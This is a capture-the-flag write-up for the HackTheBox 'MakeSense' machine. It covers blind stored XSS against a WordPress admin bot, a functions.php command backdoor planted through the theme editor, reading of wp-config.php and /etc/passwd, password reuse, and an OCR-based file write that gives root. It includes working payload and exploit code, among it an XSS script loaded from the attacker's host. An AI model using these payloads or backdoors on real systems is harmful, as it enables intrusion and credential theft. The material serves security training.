Medium / Hard · Linux

MakeSense

HackTheBox
Stored XSS Admin Session Hijack Arbitrary File Write
Blind Stored XSS → Live Session Hijack → Theme Editor RCE → OCR File-Write to Root

OS: Linux (Ubuntu 24.04)  ·  Attack chain: Stored XSS → Admin session hijack → RCE (www-data) → Config leak → Internal service abuse → Root

01

Recon

nmap -sC -sV -p- <TARGET_IP>
  • 22/tcp — OpenSSH 9.6p1 (Ubuntu)
  • 80/tcp — filtered
  • 443/tcp — Apache 2.4.58, SSL cert CN=makesense.htb, WordPress running a custom "webagency" theme ("Agency LLC")
  • 8001/tcp — filtered from outside; later confirmed bound to 127.0.0.1 only (internal)

Only 22 and 443 are reachable externally. Added the vhost to /etc/hosts:

<TARGET_IP>    makesense.htb
02

Enumeration

The homepage is a WordPress site for "Agency LLC" with a custom theme (webagency) featuring an unusual "voice call" widget — visitors can leave a voice message that's transcribed and summarized client-side using a Whisper.cpp WASM build, then encrypted and sent to the server for admin review.

Script tags on the homepage:

curl -sk https://makesense.htb/ | grep -oP '<script[^>]+src="[^"]+"'
<script id="whisper-wrapper-js" src=".../assets/js/whisper/whisper-wrapper.js?ver=1.0"
<script id="webagency-main-js" src=".../assets/js/main.js?ver=1.0"

Pulled and read both files:

curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/main.js -o main.js
curl -sk https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js -o whisper-wrapper.js

Two critical findings inside whisper-wrapper.js:

1. A hardcoded AES-GCM encryption key, shipped in plaintext to every visitor's browser:

// Line 6-7
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
// Lines 464-488 — how it's used
async encryptPayload(payload) {
    const keyMaterial = await crypto.subtle.digest('SHA-256', encoder.encode(ENCRYPTION_KEY));
    const key = await crypto.subtle.importKey('raw', keyMaterial, {name:'AES-GCM'}, ...);
    const iv = crypto.getRandomValues(new Uint8Array(12));
    // AES-GCM encrypt with random 12-byte IV
}

Since this key has to be usable by the browser to encrypt data before sending it, it can never actually be secret — anyone can pull it from the public JS bundle.

2. A word-to-symbol mapping table (around line 548) that converts spoken phrases like "open bracket," "quote," "slash" into literal <, ', / characters — i.e., the app was explicitly built to let dictated speech become markup/script syntax once transcribed. This is effectively a built-in path from voice input to XSS.

The AJAX flow (from main.js), fully visible in page source (webagency_ajax.nonce, webagency_ajax.ajax_url):

ActionPurpose
submit_contact_formCreates a WP post, returns a post_id
save_voice_resultsAccepts post_id + an AES-GCM encrypted {transcription, summary} payload, decrypts server-side, stores for admin review

Because the key is static and public, there's no need to touch the actual audio/Whisper pipeline — payloads can be built and encrypted directly with Python.

Uploads directory also enumerated:

curl -sk "https://makesense.htb/wp-content/uploads/2026/01/"

Found voice-message.wav — a leftover audio submission. (Transcribing this file separately revealed a spoken hint referencing test credentials — a secondary, less direct path to creds that wasn't needed once RCE was achieved via the XSS chain below.)

Why this matteredAny encryption key the browser needs in order to encrypt data is not actually secret, no matter how it's delivered — treat client-side "encryption" as obfuscation at best, and a word-to-symbol table that turns speech into markup syntax is a red flag worth investigating on sight.
03

Foothold

Stage 1 — Blind stored XSS via the admin review process

Built a Python helper to replicate the browser's encryption scheme:

def encrypt_voice_payload(payload):
    digest = hashlib.sha256(VOICE_KEY).digest()
    iv = os.urandom(12)
    ciphertext = AESGCM(digest).encrypt(iv, json.dumps(payload).encode(), None)
    return base64.b64encode(iv + ciphertext).decode()

Grabbed a nonce and created a post:

contact = http_post(target_ip, "/wp-admin/admin-ajax.php", {
    "action": "submit_contact_form",
    "nonce": nonce,
    "name": "Project Review", "email": "review@example.com",
    "phone": "555-0100", "message": "Please review the attached project summary.",
})
post_id = json.loads(contact)["data"]["post_id"]

Submitted an encrypted XSS payload as the "voice results" for that post:

xss = f'<script src="http://{tun_ip}:8000/payload.js"></script>'
encrypted = encrypt_voice_payload({"transcription": xss, "summary": xss})
http_post(target_ip, "/wp-admin/admin-ajax.php", {
    "action": "save_voice_results", "nonce": nonce,
    "post_id": post_id, "encrypted_payload": encrypted,
})

A background process reviews new submissions in wp-admin on a recurring schedule (an "admin bot"). A listener confirmed the script fired when that review happened:

[callback] /hit: {"href":"https://makesense.htb/wp-admin/edit.php?post_type=contact_submission", ...}

Stage 2 — XSS to RCE via the Theme Editor (single-session escalation)

WordPress auth cookies are HttpOnly, so document.cookie theft returns nothing usable:

GET /?p=wp-settings-time-3=... HTTP/1.1

(only the non-HttpOnly settings cookie leaks — session/auth cookies never appear)

Instead of stealing cookies, the payload made authenticated fetch() calls directly from inside the admin bot's live session, using credentials: 'include' so the browser attaches the bot's real cookies automatically — no exfiltration needed:

const page = await fetch('/wp-admin/theme-editor.php?theme=webagency&file=functions.php',
                          {credentials: 'include'});
// scrape nonce + existing file content from the returned HTML
const nonce = doc.querySelector('input[name="nonce"]').value;
const content = doc.querySelector('textarea[name="newcontent"]').value;

// append a command-execution backdoor to functions.php
const hook = `add_action('init', function(){
    if (isset($_REQUEST['okcmd'])) { system($_REQUEST['okcmd']); exit; }
});`;

await fetch('/wp-admin/theme-editor.php', {
    method: 'POST', credentials: 'include',
    body: new URLSearchParams({nonce, newcontent: content + hook,
                               action:'update', file:'functions.php',
                               theme:'webagency', submit:'Update File'})
});

Callback confirmed each stage:

[callback] /editor: {"nonce":"2695d43fc8","hasContent":true}
[callback] /updated: {"status":200,"ok":true}
[callback] /cmd-id: uid=33(www-data) gid=33(www-data) groups=33(www-data)

Verified independently:

curl -sk "https://makesense.htb/?okcmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

Note: this collapses what could be two separate WordPress admin-abuse techniques (creating a rogue admin account vs. directly weaponizing the bot's live session) into one — no persistent admin account was created; the backdoor was planted in a single automated XSS execution.

Why this matteredBlind XSS against an automated reviewer is just as real as XSS against a human, and when cookies are HttpOnly, running requests from inside the compromised session rather than trying to exfiltrate it is the more reliable pattern — the browser already holds valid credentials, so use them where they are.
04

Privilege Escalation

With www-data RCE, read the WordPress config (this install uses SQLite, not MySQL):

curl -sk "https://makesense.htb/?okcmd=cat+/var/www/html/wp-config.php" | grep -i "DB_\|AUTH_KEY"
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );
define( 'DB_USER', 'walter' );
define( 'DB_PASSWORD', '<password>' );

Confirmed /etc/passwd shows walter is also a real Linux login (not just a DB user):

curl -sk "https://makesense.htb/?okcmd=cat+/etc/passwd" | grep walter
# walter:x:1000:1000:walter:/home/walter:/bin/bash

Credential reuse confirmed — the DB password worked directly over SSH:

sshpass -p '<password>' ssh walter@<TARGET_IP>
walter@makesense:~$ cat user.txt
User Flag

Discovering the internal service

curl -sk "https://makesense.htb/?okcmd=ss+-tlnp"
LISTEN 0 4096 127.0.0.1:8001 0.0.0.0:*
curl -sk "https://makesense.htb/?okcmd=ps+aux" | grep 8001
# root  1352  ...  php -S 127.0.0.1:8001 -t /root/ocr4/

A PHP built-in dev server, running as root, bound to localhost only, serving files from a directory under root's home. Kept alive by a root-owned watchdog script:

# /root/.scripts/start_ocr4.sh
while true; do
  if ! pgrep -f "php -S.*8001" > /dev/null; then
    php -S 127.0.0.1:8001 -t /root/ocr4/ &
  fi
  sleep 1
done

Since it's internal-only, reached it via an SSH local port-forward:

sshpass -p '<password>' ssh -N -L 18001:127.0.0.1:8001 walter@<TARGET_IP> &

The service required HTTP Basic Auth — same walter/password combo, reused a third time:

$AUTH_USER = 'walter';
$AUTH_PASS = '<password>';
Why this matteredReading config files immediately after any code execution is close to free and routinely pays off — three reuses of the same password across WordPress DB, SSH, and an internal HTTP Basic Auth service turned a single config leak into a full compromise chain.
05

The OCR App Itself — Vulnerable Code

/root/ocr4/index.php is a "draw text, get it recognized" OCR tool built on tesseract:

// Recognition
exec("tesseract " . escapeshellarg($imagePath) . " " . escapeshellarg($outputBase));
$outputText = file_get_contents($outputBase . '.txt');
$_SESSION['ocr_results'][$ocr_id] = $outputText;

// "Save output" — the vulnerable part
$filename = basename($_POST['filename']);
$filename = preg_replace('/[^a-zA-Z0-9._-]/', '_', $filename);   // blocks path traversal...
$filePath = $saveDir . '/' . $filename;                            // ...but NOT dangerous extensions
file_put_contents($filePath, $outputText);                         // writes attacker-controlled content

$saveDir (saved/) sits directly under the PHP dev server's document root. There's no extension whitelist and no content validation — an attacker who controls both the recognized text and the destination filename gets an arbitrary file write into a directory the server will execute.

Exploitation

import base64, re, sys, time
from io import BytesIO
import requests
from PIL import Image, ImageDraw, ImageFont

WP_USER, WP_PASS = "walter", "<password>"
FONT = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
BASE = "http://127.0.0.1:18001/"

def make_ocr_data_url(text):
    font = ImageFont.truetype(FONT, 34)
    probe = Image.new("RGB", (10, 10), "white")
    bbox = ImageDraw.Draw(probe).textbbox((0, 0), text, font=font)
    img = Image.new("RGB", (bbox[2]-bbox[0]+80, bbox[3]-bbox[1]+80), "white")
    ImageDraw.Draw(img).text((40, 40), text, fill="black", font=font)
    bio = BytesIO(); img.save(bio, format="PNG")
    return "data:image/png;base64," + base64.b64encode(bio.getvalue()).decode()

tesseract read the drawn PHP text back essentially verbatim, the app wrote it straight to saved/shell_*.php inside its own web root, and since php -S was started by root and never drops privileges, requesting that file executes as root.

Why this matteredAny feature that lets a user pick both content and a save filename inside a privileged, web-served directory is an arbitrary file write waiting to become RCE — filename sanitization that blocks path traversal but not dangerous extensions is a half-fix.
06

Key Takeaways

  • Client-side "encryption" is not a security boundary if the key ships in the JS bundle. Anything the browser needs to encrypt with, the browser can also leak. Treat it as obfuscation at best.
  • A function that maps spoken words into angle brackets and quotes is a red flag on its own — a feature explicitly built (or backdoored) to let dictation become markup/script.
  • Blind XSS against an internal reviewer doesn't need cookie theft to be useful, especially when cookies are HttpOnly. Running authenticated fetch() calls directly from inside that session (credentials:'include') is more reliable — it uses the target's session live rather than trying to exfiltrate and replay it.
  • WordPress's Theme/Plugin editors are instant code execution once you have admin-level session access — no plugin upload required.
  • Read wp-config.php immediately after any RCE. DB credentials are one of the most common lateral-movement vectors when admins reuse passwords across services (here: WordPress DB → SSH → internal HTTP Basic Auth, three reuses of one password).
  • Any feature that lets a user choose both content and a save-destination inside a web-served, privileged directory is an arbitrary file write — and it becomes RCE the instant that directory is also executable by the server process.
07

Methodology Notes (for next time)

  • Once any code execution is gained, prioritize reading config files (wp-config.php, .env, etc.) and listing processes/ports (ps aux, ss -tlnp) before looking elsewhere — that's usually where the next pivot hides.
  • When XSS lands but cookies are HttpOnly, pivot immediately to "act from inside the session" (credentials:'include' fetches) rather than chasing cookie exfiltration.
  • Voice/audio uploads on a box with a transcription feature are worth transcribing — even a low-fidelity local Whisper run or online transcription service can surface hints that aren't visible anywhere else.
